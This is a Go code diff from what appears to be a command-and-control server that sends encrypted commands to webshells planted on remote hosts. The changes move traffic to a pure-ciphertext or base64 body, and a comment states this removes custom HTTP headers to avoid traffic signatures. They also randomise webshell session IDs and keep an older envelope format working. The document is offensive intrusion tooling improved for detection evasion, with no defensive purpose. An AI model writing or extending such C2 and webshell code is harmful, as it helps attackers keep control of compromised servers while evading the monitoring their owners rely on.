@@ -94,7 +94,7 @@ func handleWebshellAdd(w http.ResponseWriter, r *http.Request, user tokenInfo) {
 		VALUES (?, ?, ?, ?, 'online', 'webshell', ?, 'active',
 		 'webshell', ?, ?, ?, ?, ?, ?, ?, ?)`,
 		clientID, hostname, osName, username,
-		fmt.Sprintf("WS-%s", strings.ToUpper(clientID[:8])),
+		genSessionID(clientID),
 		data.URL, data.EncAlgo, data.EncPwd, data.Headers, data.Timeout, data.Proxy,
 		nowLocal(), nowLocal())
 
@@ -245,26 +245,28 @@ func webshellExec(url, action string, param map[string]interface{}, encAlgo, enc
 		"param":  param,
 	}
 
-	// 加密请求体
+	// 加密请求体（信封协议，无自定义 HTTP 头，避免流量特征）
 	algo := strings.ToLower(encAlgo)
 	if algo == "aes" {
 		algo = "aes-128-cbc"
 	}
+	if algo == "" {
+		algo = "none"
+	}
 
 	var body string
-	reqHeaders := map[string]string{"Content-Type": "text/plain"}
-	if algo != "" && algo != "none" {
-		// 用 WebShell 独立密码加密
+	reqHeaders := map[string]string{"Content-Type": "application/json; charset=utf-8"}
+	j, _ := json.Marshal(payload)
+	if algo != "none" {
+		// 纯密文协议: body 是 base64(IV+密文)，算法用 WebShell 配置的 encAlgo（不传输）
 		encrypted, _, err := encEncryptJSON(payload, algo, encPwd)
 		if err != nil {
 			return nil, fmt.Errorf("加密失败: %w", err)
 		}
 		body = encrypted
-		reqHeaders["X-Enc-Algo"] = algo
 	} else {
-		j, _ := json.Marshal(payload)
-		body = string(j)
-		reqHeaders["Content-Type"] = "application/json"
+		// none 模式: body 是 base64(JSON)
+		body = base64.StdEncoding.EncodeToString(j)
 	}
 
 	// 合并自定义头
@@ -310,47 +312,70 @@ func webshellExec(url, action string, param map[string]interface{}, encAlgo, enc
 		return nil, fmt.Errorf("WebShell 返回 HTTP %d: %s", resp.StatusCode, bodyPreview)
 	}
 
-	respAlgo := strings.ToLower(strings.TrimSpace(resp.Header.Get("X-Enc-Algo")))
-	if respAlgo == "" {
-		respAlgo = "none"
-	}
+	// 解析响应：优先纯密文格式（用 WebShell 配置的 encAlgo 解密），兼容旧信封格式 {"_a":"algo","_d":"enc_data"}
+	respText := strings.TrimSpace(string(respBody))
 
-	if respAlgo != "none" {
-		// 解密响应（用 WebShell 独立密码）
-		decrypted, err := encDecrypt(string(respBody), respAlgo, encPwd)
-		if err != nil {
-			// 解密失败，尝试明文 JSON
+	// 优先尝试纯密文解密（用 WebShell 配置的 encAlgo）
+	if algo != "none" {
+		decrypted, err := encDecrypt(respText, algo, encPwd)
+		if err == nil {
 			var m map[string]interface{}
-			if jErr := json.Unmarshal(respBody, &m); jErr == nil {
+			if json.Unmarshal(decrypted, &m) == nil {
 				return m, nil
 			}
-			return nil, fmt.Errorf("加密配置不一致: WebShell 用 %s 加密响应，但 C2 解密失败 (respAlgo=%s, bodyLen=%d)", respAlgo, respAlgo, len(respBody))
 		}
-		var m map[string]interface{}
-		if err := json.Unmarshal(decrypted, &m); err != nil {
-			return nil, fmt.Errorf("响应 JSON 解析失败: %w (decrypted preview: %s)", err, string(decrypted[:min(200, len(decrypted))]))
+	} else {
+		// none 模式: body 是 base64(JSON)
+		decoded, dErr := base64.StdEncoding.DecodeString(respText)
+		if dErr == nil {
+			var m map[string]interface{}
+			if json.Unmarshal(decoded, &m) == nil {
+				return m, nil
+			}
 		}
-		return m, nil
 	}
 
-	// 明文响应
-	var m map[string]interface{}
-	if err := json.Unmarshal(respBody, &m); err == nil {
-		return m, nil
-	}
-	// 尝试 base64 解码
-	decoded, dErr := encDecrypt(string(respBody), "none", encPwd)
-	if dErr == nil {
-		if err := json.Unmarshal(decoded, &m); err == nil {
+	// 兼容旧信封格式 {"_a":"algo","_d":"enc_data"}
+	var envelope map[string]interface{}
+	if jErr := json.Unmarshal(respBody, &envelope); jErr == nil {
+		if envAlgo, ok := envelope["_a"].(string); ok {
+			encData, _ := envelope["_d"].(string)
+			if encData == "" {
+				return envelope, nil
+			}
+			if envAlgo == "none" || envAlgo == "" {
+				decoded, dErr := base64.StdEncoding.DecodeString(encData)
+				if dErr == nil {
+					var m map[string]interface{}
+					if json.Unmarshal(decoded, &m) == nil {
+						return m, nil
+					}
+				}
+				return nil, fmt.Errorf("信封 none 模式响应解析失败 (bodyLen=%d)", len(respBody))
+			}
+			decrypted, err := encDecrypt(encData, envAlgo, encPwd)
+			if err != nil {
+				return nil, fmt.Errorf("加密配置不一致: WebShell 用 %s 加密响应，但 C2 解密失败 (bodyLen=%d)", envAlgo, len(respBody))
+			}
+			var m map[string]interface{}
+			if err := json.Unmarshal(decrypted, &m); err != nil {
+				return nil, fmt.Errorf("响应 JSON 解析失败: %w (decrypted preview: %s)", err, string(decrypted[:min(200, len(decrypted))]))
+			}
 			return m, nil
 		}
+		// JSON 但不是信封格式，直接返回
+		return envelope, nil
 	}
+
 	// 最后尝试：如果响应看起来像 HTML（404 页面等），返回友好错误
-	bodyPreview := string(respBody[:min(300, len(respBody))])
+	bodyPreview := respText
+	if len(bodyPreview) > 300 {
+		bodyPreview = bodyPreview[:300]
+	}
 	if strings.Contains(bodyPreview, "<html") || strings.Contains(bodyPreview, "<!DOCTYPE") {
 		return nil, fmt.Errorf("WebShell 返回了 HTML 页面而非 JSON（可能 URL 错误或 WebShell 未正确部署）: HTTP %d", resp.StatusCode)
 	}
-	return nil, fmt.Errorf("WebShell 响应解析失败 (HTTP %d, respAlgo=%s, bodyLen=%d): %s", resp.StatusCode, respAlgo, len(respBody), bodyPreview)
+	return nil, fmt.Errorf("WebShell 响应解析失败 (HTTP %d, bodyLen=%d): %s", resp.StatusCode, len(respBody), bodyPreview)
 }
 
 func min(a, b int) int {
